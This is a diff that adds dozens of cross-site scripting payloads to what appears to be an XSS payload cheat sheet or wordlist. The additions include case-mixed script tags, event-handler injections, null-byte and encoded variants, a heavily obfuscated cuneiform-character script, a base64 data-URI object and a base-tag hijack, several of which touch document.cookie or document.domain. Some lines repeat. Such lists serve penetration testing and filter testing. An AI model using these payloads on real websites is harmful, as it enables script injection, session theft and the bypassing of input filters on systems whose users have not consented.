@@ -322,6 +322,86 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <a href=javas&#99;ript:alert(1)>
 \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
 "><img src=x onerror=alert(document.cookie);.jpg
+<sCrIpt>alert(1)</ScRipt>
+<ScrIPt>alert(1)</ScRipT>
+<img src='1' onerror='alert(0)' <
+<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+<img src='1' onerror\x00=alert(0) />
+<img src='1' onerror\x0b=alert(0) />
+<img src='1' onerror\x0d=alert(0) />
+<img src='1' onerror\x0a=alert(0) />
+<img src='1' onerror/=alert(0) />
+<img/src='1'/onerror=alert(0)>
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
+javascript:alert(1)//INJECTX
+<svg/onload=alert(1)>//INJECTX
+<img onload=alert(1)>//INJECTX
+<img src=x onerror=prompt(1)>//INJECTX
+<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
+ onmouseover="document.cookie=true;">//INJECTX
+alert(1)>//INJECTX
+<h1>INJECTX</h1>
+<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
+<svg><script>/<@/>alert(1)</script>//INJECTX
+<svg/onload=alert(/INJECTX/)>
+<iframe/onload=alert(/INJECTX/)>
+<svg/onload=alert`INJECTX`>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(`INJECTX`)>
+}alert(/INJECTX/);{//
+<h1/onclick=alert(1)>a//INJECTX
+<svg/onload=alert(/INJECTX/)>
+<p/onclick=alert(/INJECTX/)>a
+<svg/onload=alert`INJECTX`>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(`INJECTX`)>
+<video><source onerror="javascript:alert(1)">//INJECTX
+<video onerror="javascript:alert(1)"><source>//INJECTX
+<audio onerror="javascript:alert(1)"><source>//INJECTX
+<input autofocus onfocus=alert(1)>//INJECTX
+<select autofocus onfocus=alert(1)>//INJECTX
+<textarea autofocus onfocus=alert(1)>//INJECTX
+<keygen autofocus onfocus=alert(1)>//INJECTX
+<button form=test onformchange=alert(1)>//INJECTX
+<form><button formaction="javascript:alert(1)">//INJECTX
+<svg onload=(alert)(1) >//INJECTX
+<script>$=1,alert($)</script>//INJECTX
+<!--<img src="--><img src=x onerror=alert(1)//">//INJECTX
+<img/src='x'onerror=alert(1)>//INJECTX
+<marguee/onstart=alert(1)>//INJECTX
+<script>alert(1)//INJECTX
+<script>alert(1)<!--INJECTX
+<marquee loop=1 width=0 onfinish=alert(1)>//INJECTX
+<a href=javas&#99;ript:alert(1)>
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+<svg/onrandom=random onload=confirm(1)>
+<video onnull=null onmouseover=confirm(1)>
+<svg/OnLoad="`${prompt``}`">
+<svg/onload=%26nbsp;alert`bohdan`+
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+</script><svg><script>alert(1)-%26apos%3B
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
+<a href=javas&#99;ript:alert(1)>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+
 ```
 
 1. Characters ' " < > / // ( ) ^ script img svg div alert prompt 
